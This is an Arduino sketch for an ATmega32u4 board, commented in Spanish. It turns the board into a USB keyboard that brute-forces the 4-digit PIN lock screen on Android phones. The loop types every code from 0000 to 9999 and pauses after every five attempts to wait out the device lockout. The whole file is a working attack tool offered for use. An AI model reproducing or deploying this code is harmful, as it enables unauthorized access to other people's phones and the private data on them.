/*
 * Humberto Keymur Landeros
 * hkeyland@gmail.com
 * 
 * Permite romper el código de protección de 4 digitos 
 * en dispositivos Android que permiten la conexi{on
 * de teclado utilizando fuerza bruta
 * 
 * ATmega32u4 
*/
#include <keyboard.h>

/*Envia los códigos al dispositivo*/
void sendPIN(int a,int b,int c,int d){
  Keyboard.print(a);
  delay(500);
  Keyboard.print(b);
  delay(500);
  Keyboard.print(c);
  delay(500);
  Keyboard.print(d);
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}

/*Espera 30 segundos el bloqueo del dispositivo*/
void waitBlocked(){
  delay(500);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  for(int i=0; i < 31; i++){
    if(i<=13){
      delay(1000);
    }
    else{
      /*Envia el bloqueo dispositivo una vez desbloqueado*/
      Keyboard.write(KEY_BACKSPACE); // delete send screen up 
      delay(1000);
      Keyboard.releaseAll();
    }
  }
  Keyboard.write(KEY_BACKSPACE);
  Keyboard.releaseAll();
} 

void setup() {
  Keyboard.begin();
  int count=0;
  int i=0;
  int j=0;
  int k=0;
  int l=0;

  /*NO MODIFICAR*/
  delay(8000);
  /*EVITA QUE ARDUINO SE BLOQUEE PARA ACTUALIZAR PROGRAMAS
  UN VALOR MENOR A 8 SEGUNDOS INICIA EL PROGRAMA
  Y NO PERMITE SUBIR UNO NUEVO DESDE EL IDE*/
  
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(1500);

  /*FUERZA BRUTA*/
  for(i=0; i < 10; i++){
    for(j=0; j < 10; j++){
      for(k=0; k < 10; k++){
        for(l=0; l < 10; l++){
          if(count==5){
            waitBlocked();            
            count=0;
          }
          else{}
          sendPIN(i,j,k,l);
          count++;
        }
      }
    }
  }
  
}

void loop() {}

